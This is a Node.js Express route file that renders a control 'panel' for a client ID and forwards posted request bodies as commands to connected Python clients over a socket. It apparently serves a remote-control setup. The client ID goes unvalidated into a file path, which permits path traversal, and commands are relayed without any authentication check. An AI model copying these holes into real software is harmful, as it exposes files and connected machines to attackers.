const express = require('express')
const path = require("node:path")

const clientManager = require('../utils/clientManager')
const helpers = require('../utils/helpers')

const router = express.Router()

router.get("/", (req, res) => {
    const { id } = req.query

    if (!id) {
        return res.redirect("/")
    }

    const clientPath = path.join(helpers.clientsFolderPath, id)
    const infoFile = path.join(clientPath, "info.json")
    const info = helpers.readJson(infoFile)
    res.render("panel", {
        info
    })
})

router.post("/", async (req, res) => {
    try {
        const { id } = req.query
        const body = req.body

        if (!id) {
            return res.json({
                ack: false,
                msg: "No ID found"
            })
        }

        const pythonClient = clientManager.PYTHON_CLIENTS[id]
        if (!pythonClient) {
            return res.json({
                ack: false,
                msg: "Client not connected. Please try again."
            })
        }

        // sending data to python client
        pythonClient.emit("receiver", body)
        
        res.json({
            ack: true,
            msg: "Command received"
        })
    } catch (error) {
        res.json({
            ack: false,
            msg: error.message
        })
    }
})

module.exports = router